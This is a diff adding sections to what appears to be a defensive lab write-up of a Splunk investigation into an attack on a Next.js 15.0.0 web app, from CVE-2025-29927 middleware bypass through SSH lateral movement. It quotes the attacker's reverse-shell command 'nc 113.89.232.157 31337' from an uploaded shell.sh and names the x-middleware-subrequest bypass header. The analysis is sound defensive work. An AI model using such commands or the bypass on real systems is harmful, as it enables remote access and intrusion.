@@ -9,3 +9,200 @@ The application was running:
 •	Next.js 15.0.0
 This information is critical because outdated framework versions may contain publicly disclosed vulnerabilities that could be exploited by attackers.
 <img width="974" height="548" alt="image" src="https://github.com/user-attachments/assets/94c08872-384b-44b0-a7d8-5a8986c46f93" />
+
+2. Attacker Identification
+To identify the source of suspicious activity, a broad search was initiated in Splunk using:
+index=*
+The ip_src field was analyzed to determine the most active source addresses.
+Using the Top Values function in Splunk, one external IP address stood out:
+218.92.0.204
+Responsible for approximately 33,290 events (37% of total traffic).
+This high volume of requests strongly indicated malicious scanning and exploitation attempts.
+Further filtering was performed:
+index=* | search ip_src=218.92.0.204
+Detailed log analysis confirmed active exploitation attempts originating from this address.
+<img width="974" height="548" alt="image" src="https://github.com/user-attachments/assets/4f42bbbd-4892-4e59-abf3-517baea6b04c" />
+<img width="974" height="548" alt="image" src="https://github.com/user-attachments/assets/13cbbd30-f349-468f-8893-c05cf3d1ab8e" />
+
+3. Enumeration Activity
+To assess the scale of the attack, logs were filtered for the identified malicious IP:
+index=* 
+| search ip_src="218.92.0.204"
+| stats count by http_request_uri
+Statistical analysis revealed that the attacker accessed 9,930 unique URIs.
+This level of activity indicates automated enumeration and systematic probing of the web application.
+Such behavior is commonly associated with reconnaissance prior to exploitation.
+<img width="974" height="548" alt="image" src="https://github.com/user-attachments/assets/4fb1e60e-bc00-4e6e-9189-14395a8f961d" />
+
+4. Discovery of Hidden Endpoints
+As part of reconnaissance, the robots.txt file was reviewed to identify restricted or hidden directories.
+The file revealed the following disallowed paths:
+Disallow: /admin
+Disallow: /admin/file-upload
+These entries indicate administrative or sensitive functionality not intended for public access.
+Such directories are commonly targeted by attackers during enumeration and exploitation attempts
+
+5. Vulnerability Research & Identification
+Based on the identified framework version (Next.js 15.0.0), additional research was conducted to determine whether publicly disclosed vulnerabilities could explain the observed attack behavior.
+A review of the National Vulnerability Database (NVD) revealed:
+CVE-2025-29927
+This vulnerability allows authorization bypass through improper middleware handling, enabling attackers to access restricted endpoints without proper authentication.
+Given the presence of hidden administrative endpoints and subsequent exploitation activity, this CVE was assessed as the likely attack vector.
+
+6. Exploitation Confirmation
+The description of CVE-2025-29927 indicates that exploitation involves abuse of the following HTTP header:
+x-middleware-subrequest
+To confirm whether this vulnerability was actively exploited, logs were reviewed in Splunk using the previously identified attacker IP:
+index=* 
+| search ip_src="218.92.0.204"
+Detailed log inspection revealed HTTP requests containing the header:
+x-middleware-subrequest
+This confirms that the attacker attempted to exploit the middleware authorization bypass vulnerability associated with CVE-2025-29927.
+
+7. Payload Delivery – Reverse Shell Upload
+Following successful exploitation of the middleware vulnerability, log analysis revealed a POST request to the following endpoint:
+/api/upload
+Filtering by attacker IP:
+index=* 
+| search ip_src="218.92.0.204"
+Inspection of the http_request_uri field identified the endpoint:
+POST /api/upload
+Further examination of the request body (http_file_data) revealed an uploaded file containing a reverse shell payload.
+The payload attempted to establish a connection to:
+113.89.232.157:31337
+This confirms the attacker attempted to achieve Remote Code Execution (RCE) and establish command-and-control communication.
+<img width="974" height="548" alt="image" src="https://github.com/user-attachments/assets/99f2b7f2-074c-4d2f-bdeb-e67e18793bab" />
+
+7. Reverse Shell Analysis
+To further analyze the uploaded payload, the HTTP request body (http_file_data) was inspected.
+A file named:
+shell.sh
+was identified within the multipart form-data request.
+The payload contained a reverse shell command:
+nc 113.89.232.157 31337
+This indicates that the compromised web server was instructed to initiate an outbound connection to:
+113.89.232.157 on port 31337
+Such behavior confirms an attempt to establish command-and-control (C2) communication following successful exploitation.
+<img width="974" height="548" alt="image" src="https://github.com/user-attachments/assets/402a4ad8-a24b-4997-a707-4d35496a6b31" />
+
+8. Lateral Movement Analysis
+Following successful exploitation of the web application server, further investigation was conducted to determine whether lateral movement occurred within the internal network.
+To identify additional affected systems, the following query was executed:
+index=* 
+| stats count by host
+This revealed two primary hosts:
+•	webapp
+•	dbserver
+The logs were then filtered for the database server:
+index=* 
+| search host="dbserver"
+Reviewing the tty and authentication-related logs revealed multiple SSH login attempts.
+Analysis confirmed the use of:
+•	SSH brute force technique
+Subsequently, a successful login was recorded for the user account:
+dbserv
+This confirms successful lateral movement from the compromised web application server to the internal database server.
+<img width="974" height="548" alt="image" src="https://github.com/user-attachments/assets/f3118d57-a33c-45bf-ba4e-4abf51b72ddb" />
+
+8. Successful Lateral Movement
+Further inspection of authentication logs on the database server revealed a successful SSH session.
+The following event was identified:
+New session 18 of user dbserv
+sshd: session opened for user dbserv
+Log source:
+/home/dbserv/auth.log
+This confirms that the attacker successfully authenticated to the database server using the account:
+dbserv
+The presence of multiple authentication attempts prior to this event suggests brute-force activity, culminating in successful lateral movement.
+<img width="974" height="548" alt="image" src="https://github.com/user-attachments/assets/469603d8-c368-464a-b1b0-3188ff56ee3e" />
+
+9. Timeline of Events
+Timeline of Attack
+Based on log correlation, the following attack sequence was identified:
+Phase 1 – Reconnaissance
+•	High-volume requests from 218.92.0.204
+•	9,930 unique URI requests observed
+•	Hidden endpoints discovered (/admin, /admin/file-upload)
+Phase 2 – Exploitation
+•	Use of header x-middleware-subrequest
+•	Exploitation of CVE-2025-29927 (Authorization Bypass)
+•	Access to restricted endpoints
+Phase 3 – Payload Delivery
+•	POST request to /api/upload
+•	Upload of shell.sh
+•	Reverse shell command detected:
+nc 113.89.232.157 31337
+Phase 4 – Command & Control
+•	Outbound connection attempt to 113.89.232.157:31337
+Phase 5 – Lateral Movement
+•	SSH brute force attempts detected
+•	Successful authentication on dbserver
+•	Account used: dbserv
+
+10. MITRE ATT&CK Mapping
+MITRE ATT&CK Techniques Observed
+•	T1190 – Exploit Public-Facing Application
+•	T1110 – Brute Force
+•	T1078 – Valid Accounts
+•	T1059 – Command and Scripting Interpreter
+•	T1105 – Ingress Tool Transfer
+•	T1021.004 – Remote Services (SSH)
+11. Impact Assessment
+Impact Assessment
+The investigation confirms:
+•	Successful exploitation of a vulnerable web framework
+•	Remote code execution attempt via reverse shell upload
+•	Attempted command-and-control communication
+•	Successful lateral movement to internal database server
+•	Compromise of internal account: dbserv
+If this were a production environment, potential impact could include:
+•	Database access and data exfiltration
+•	Further privilege escalation
+•	Full infrastructure compromise
+
+12. Recommendations
+Security Recommendations
+To prevent similar incidents, the following measures are recommended:
+1.	Patch Next.js to a non-vulnerable version
+2.	Implement Web Application Firewall (WAF)
+3.	Restrict access to administrative endpoints
+4.	Enforce Multi-Factor Authentication (MFA)
+5.	Disable password-based SSH authentication
+6.	Implement account lockout policy for failed login attempts
+7.	Monitor abnormal outbound connections
+8.	Enable centralized logging and real-time alerting
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
